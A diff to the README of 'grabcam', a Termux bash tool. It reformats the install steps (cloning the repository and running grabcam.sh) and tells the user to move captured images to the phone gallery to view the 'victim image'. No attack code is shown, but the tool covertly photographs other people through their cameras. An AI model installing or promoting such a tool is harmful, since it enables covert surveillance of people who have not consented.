@@ -21,43 +21,22 @@ grabcam is a bash based script which is officially made for termux from this too
 
 ### ?? ***Installation and usage guide***:
 ```
-$ apt-get update -y
-```
-```
-$ apt-get upgrade -y
-```
-```
-$ pkg install python -y 
-```
-```
-$ pkg install python2 -y
-```
-```
-$ pkg install git -y
-```
-```
-$ pip install lolcat
-```
-```
-$ git clone https://github.com/noob-hackers/grabcam
-```
-```
-$ ls
-```
-```
-$ cd grabcam
-```
-```
-$ ls
-```
-```
-$ bash grabcam.sh
+apt-get update -y
+apt-get upgrade -y
+pkg install python -y 
+pkg install python2 -y
+pkg install git -y
+pip install lolcat
+git clone https://github.com/noob-hackers/grabcam
+cd grabcam
+bash grabcam.sh
 ```
 to see captured images >>>
 
-$ ls
-
+```
+ls
 $ mv (image name with .png) /sdcard
+```
 
 Now go and chek your gallery for victim image...
 
